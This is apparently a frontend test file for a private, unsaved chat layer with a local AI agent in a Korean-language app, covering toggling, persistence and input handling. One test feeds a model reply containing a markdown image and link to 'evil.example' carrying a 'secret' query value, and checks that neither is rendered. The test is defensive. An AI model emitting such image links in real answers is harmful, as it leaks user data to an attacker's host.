import {
  act,
  cleanup,
  fireEvent,
  render,
  screen,
  waitFor,
  within,
} from "@testing-library/react";
import { afterEach, beforeEach, expect, test, vi } from "vitest";
import type { Agent } from "../api";
import { PrivateCovered, PrivateGhost, PrivateOverlay } from "./PrivateLayer";

const encoder = new TextEncoder();
const line = (value: unknown) => encoder.encode(`${JSON.stringify(value)}\n`);

let posted: { url: string; body: unknown }[] = [];

/** A local model that answers every private turn with the given tokens. */
function stubModel(tokens: string[]) {
  posted = [];
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init: RequestInit) => {
      posted.push({ url, body: JSON.parse(String(init.body)) });
      const stream = new ReadableStream<Uint8Array>({
        start(controller) {
          for (const token of tokens) controller.enqueue(line({ token }));
          controller.enqueue(line({ done: true }));
          controller.close();
        },
      });
      return new Response(stream, {
        headers: { "Content-Type": "application/x-ndjson" },
      });
    }),
  );
}

let reduced = false;
let count = 0;
let agent: Agent;
beforeEach(() => {
  count += 1;
  reduced = false;
  vi.stubGlobal("matchMedia", (query: string) => ({
    matches: query.includes("reduce") ? reduced : false,
  }));
  agent = {
    id: `a${count}`,
    name: `local${count}`,
    display_name: "Gemma",
    private_ok: true,
  } as Agent;
  stubModel(["안녕", "하세요"]);
});
afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

/** The DM as DMPage puts it together: the normal DM under PrivateCovered (header with
 * the ghost, the normal composer), the layer over <main>. */
function DM({ who = agent }: { who?: Agent }) {
  return (
    <main data-testid="main">
      <PrivateCovered agent={who}>
        <header>
          <PrivateGhost agent={who} />
        </header>
        <textarea aria-label="일반 메시지" />
      </PrivateCovered>
      <PrivateOverlay agent={who} />
    </main>
  );
}

const layer = () => screen.queryByRole("region", { name: "비공개 대화" });
const ghost = () => screen.getByRole("button", { name: "비공개 대화로 전환" });

function openPrivate(x = 300, y = 80) {
  const main = screen.getByTestId("main");
  vi.spyOn(main, "getBoundingClientRect").mockReturnValue({
    left: 100,
    top: 50,
    right: 900,
    bottom: 650,
    width: 800,
    height: 600,
    x: 100,
    y: 50,
    toJSON: () => ({}),
  });
  fireEvent.click(ghost(), { clientX: x, clientY: y });
}

async function sendText(text: string) {
  const input = screen.getByRole("textbox", { name: "비공개 메시지 입력" });
  fireEvent.change(input, { target: { value: text } });
  fireEvent.keyDown(input, { key: "Enter" });
}

test("ghost button only when private_ok", () => {
  const { unmount } = render(<DM />);
  expect(ghost()).toHaveAttribute("aria-pressed", "false");
  unmount();
  render(<DM who={{ ...agent, private_ok: false }} />);
  expect(
    screen.queryByRole("button", { name: "비공개 대화로 전환" }),
  ).toBeNull();
  expect(layer()).toBeNull();
});

test("toggling opens and closes the layer with origin", () => {
  render(<DM />);
  expect(layer()).toBeNull(); // closed: hidden from the accessibility tree
  openPrivate(300, 80);
  const shown = layer();
  expect(shown).not.toBeNull();
  expect(shown).toHaveAttribute("data-open", "true");
  expect(shown?.style.getPropertyValue("--x")).toBe("200px");
  expect(shown?.style.getPropertyValue("--y")).toBe("30px");
  // The header ghost now says it goes back.
  expect(
    screen.getAllByRole("button", { name: "일반 대화로 돌아가기" }).length,
  ).toBeGreaterThan(0);
  fireEvent.click(
    within(shown as HTMLElement).getByRole("button", {
      name: "일반 대화로 돌아가기",
    }),
    { clientX: 260, clientY: 70 },
  );
  expect(layer()).toBeNull();
  expect(
    document.querySelector(".private-layer")?.getAttribute("data-open"),
  ).toBe("false");
});

test("shows the banner and the empty-state line", () => {
  render(<DM />);
  openPrivate();
  const shown = layer() as HTMLElement;
  expect(
    within(shown).getByText(
      "비공개 대화 · 이 기기와 내 네트워크의 모델만 쓰고, 앱을 끄면 사라져요",
    ),
  ).toBeInTheDocument();
  expect(
    within(shown).getByText("여기서 나눈 대화는 어디에도 저장되지 않아요"),
  ).toBeInTheDocument();
  expect(within(shown).getByText("비공개 · 저장 안 됨")).toBeInTheDocument();
});

test("keeps private turns across toggles and remounts", async () => {
  const stored = vi.spyOn(Storage.prototype, "setItem");
  const first = render(<DM />);
  openPrivate();
  await sendText("비밀 메모");
  await waitFor(() =>
    expect(within(layer() as HTMLElement).getByText("안녕하세요")),
  );
  // Back to the normal DM, then to another channel (unmount)…
  fireEvent.click(
    within(layer() as HTMLElement).getByRole("button", {
      name: "일반 대화로 돌아가기",
    }),
  );
  first.unmount();
  // …and back: still closed as left, and the conversation is still there.
  const second = render(<DM />);
  expect(layer()).toBeNull();
  openPrivate();
  expect(
    within(layer() as HTMLElement).getByText("비밀 메모"),
  ).toBeInTheDocument();
  expect(
    within(layer() as HTMLElement).getByText("안녕하세요"),
  ).toBeInTheDocument();
  // Open state also survives leaving the channel while private.
  second.unmount();
  render(<DM />);
  expect(layer()).not.toBeNull();
  expect(stored).not.toHaveBeenCalled();
});

test("sends with Enter but not while composing", async () => {
  render(<DM />);
  openPrivate();
  const input = screen.getByRole("textbox", { name: "비공개 메시지 입력" });
  fireEvent.change(input, { target: { value: "가" } });
  fireEvent.keyDown(input, { key: "Enter", isComposing: true });
  fireEvent.keyDown(input, { key: "Enter", shiftKey: true });
  expect(posted).toHaveLength(0);
  fireEvent.keyDown(input, { key: "Enter" });
  await waitFor(() => expect(posted).toHaveLength(1));
  expect(posted[0].url).toContain(`/agents/${agent.name}/private`);
  expect(input).toHaveValue("");
});

test("clear button empties", async () => {
  render(<DM />);
  openPrivate();
  await sendText("지울 글");
  await waitFor(() =>
    expect(within(layer() as HTMLElement).getByText("안녕하세요")),
  );
  fireEvent.click(screen.getByRole("button", { name: "대화 지우기" }));
  expect(screen.queryByText("지울 글")).toBeNull();
  expect(
    screen.getByText("여기서 나눈 대화는 어디에도 저장되지 않아요"),
  ).toBeInTheDocument();
});

test("reduced motion skips animation class", () => {
  const { unmount } = render(<DM />);
  openPrivate();
  expect(layer()).toHaveClass("private-animate");
  expect(document.querySelector(".private-ring")).not.toBeNull();
  act(() => {
    fireEvent.click(
      within(layer() as HTMLElement).getByRole("button", {
        name: "일반 대화로 돌아가기",
      }),
    );
  });
  unmount();
  reduced = true;
  render(<DM />);
  openPrivate();
  expect(layer()).not.toHaveClass("private-animate");
  expect(document.querySelector(".private-ring")).toBeNull();
});

test("the normal DM under the layer cannot be reached", () => {
  render(<DM />);
  const normal = screen.getByRole("textbox", { name: "일반 메시지" });
  expect(normal.closest("[inert]")).toBeNull();
  openPrivate();
  // Typing there would go to the saved conversation: keep it out of reach.
  expect(normal.closest("[inert]")).not.toBeNull();
});

test("answers do not load images or links", async () => {
  stubModel([
    "![x](https://evil.example/p?d=secret) and [y](https://evil.example)",
  ]);
  render(<DM />);
  openPrivate();
  await sendText("요약해 줘");
  const shown = layer() as HTMLElement;
  await waitFor(() =>
    expect(shown.textContent).toContain("https://evil.example/p?d=secret"),
  );
  expect(shown.querySelector("img")).toBeNull();
  expect(shown.querySelector("a[href]")).toBeNull();
  expect(shown.textContent).toContain("y");
});

test("a file dropped anywhere on the layer becomes a draft", () => {
  render(<DM />);
  openPrivate();
  const area = within(layer() as HTMLElement).getByRole("region", {
    name: "비공개 메시지",
  });
  const file = new File(["메모"], "drop.txt", { type: "text/plain" });
  const dataTransfer = { files: [file], types: ["Files"] };
  expect(fireEvent.dragOver(area, { dataTransfer })).toBe(false);
  expect(fireEvent.drop(area, { dataTransfer })).toBe(false);
  expect(within(layer() as HTMLElement).getAllByText("drop.txt")).toHaveLength(
    1,
  );
  // On the composer it is added once, not again by the layer.
  const second = new File(["둘"], "card.txt", { type: "text/plain" });
  fireEvent.drop(screen.getByRole("textbox", { name: "비공개 메시지 입력" }), {
    dataTransfer: { files: [second], types: ["Files"] },
  });
  expect(within(layer() as HTMLElement).getAllByText("card.txt")).toHaveLength(
    1,
  );
});

test("each agent keeps its own private layer", () => {
  let now = 1_000_000;
  vi.spyOn(Date, "now").mockImplementation(() => now);
  const other = { ...agent, id: `${agent.id}b`, name: `${agent.name}b` };
  // B was made private long ago.
  const first = render(<DM who={other} />);
  openPrivate();
  first.unmount();
  now += 10_000;
  const { rerender } = render(<DM />);
  openPrivate();
  fireEvent.change(
    screen.getByRole("textbox", { name: "비공개 메시지 입력" }),
    { target: { value: "A에게만" } },
  );
  now += 10_000;
  // Straight to B's DM (DMPage is not remounted between DMs).
  rerender(<DM who={other} />);
  expect(
    screen.getByRole("textbox", { name: "비공개 메시지 입력" }),
  ).toHaveValue("");
  expect(layer()).not.toHaveClass("private-animate");
  expect(document.querySelector(".private-ring")).toBeNull();
  // Back to A, still private: no circle replay.
  rerender(<DM />);
  expect(layer()).toHaveAttribute("data-open", "true");
  expect(layer()).not.toHaveClass("private-animate");
  expect(document.querySelector(".private-ring")).toBeNull();
});
